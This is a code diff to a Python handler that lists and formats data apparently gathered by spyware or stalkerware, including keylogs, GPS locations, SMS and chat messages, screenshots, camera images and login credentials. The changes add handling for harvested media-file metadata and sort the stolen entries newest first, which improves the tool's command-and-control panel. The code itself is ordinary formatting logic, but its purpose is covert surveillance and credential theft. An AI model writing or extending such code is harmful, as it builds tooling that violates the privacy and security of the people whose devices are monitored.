@@ -18,7 +18,7 @@ def serve_data_listing(request_handler, data_type):
             "keylog": ["keylog", "keylogger", "keyboard", "input"],
             "location": ["location", "location_data", "gps"],
             "messages": ["messages", "message", "sms", "chat"],
-            "screenshots": ["screenshot", "screenshots", "screen", "camera", "image"]
+            "screenshots": ["screenshot", "screenshots", "screen", "camera", "image", "media_metadata"]
         }
 
         # Process data for the requested type
@@ -111,15 +111,20 @@ def serve_data_listing(request_handler, data_type):
                                     except json.JSONDecodeError:
                                         pass
 
-                            elif any(x in type_key.lower() for x in ["screenshot", "screen", "camera", "image"]):
-                                # For screenshot/image data, ensure image_data field exists
-                                if "image_data" in payload_json:
-                                    # Image data is already in the right field
-                                    pass
+                            elif any(x in type_key.lower() for x in ["media", "file", "metadata"]):
+                                # Handle media metadata
+                                if "media_files" in payload_json:
+                                    formatted_entry["data"]["files_count"] = len(payload_json["media_files"])
+                                    formatted_entry["data"]["files"] = payload_json["media_files"]
                                 elif "data" in payload_json and isinstance(payload_json["data"], str):
-                                    # Check if nested data contains an image
-                                    if payload_json["data"].startswith("data:image") or len(payload_json["data"]) > 100:
-                                        formatted_entry["data"]["image_data"] = payload_json["data"]
+                                    try:
+                                        # Try to parse nested data
+                                        nested_data = json.loads(payload_json["data"])
+                                        if "media_files" in nested_data:
+                                            formatted_entry["data"]["files_count"] = len(nested_data["media_files"])
+                                            formatted_entry["data"]["files"] = nested_data["media_files"]
+                                    except:
+                                        pass
 
                             elif any(x in type_key.lower() for x in ["credentials", "auth", "login"]):
                                 # Format credentials data
@@ -161,7 +166,10 @@ def serve_data_listing(request_handler, data_type):
         request_handler.send_response(200)
         request_handler.send_header("Content-type", "application/json")
         request_handler.end_headers()
-        request_handler.wfile.write(json.dumps(entries).encode())
+
+        # Sort entries by timestamp (newest first)
+        sorted_entries = sorted(entries, key=lambda x: x.get("timestamp", ""), reverse=True)
+        request_handler.wfile.write(json.dumps(sorted_entries).encode())
         return True
     except Exception as e:
         logger.error(f"Error serving data listing: {str(e)}")
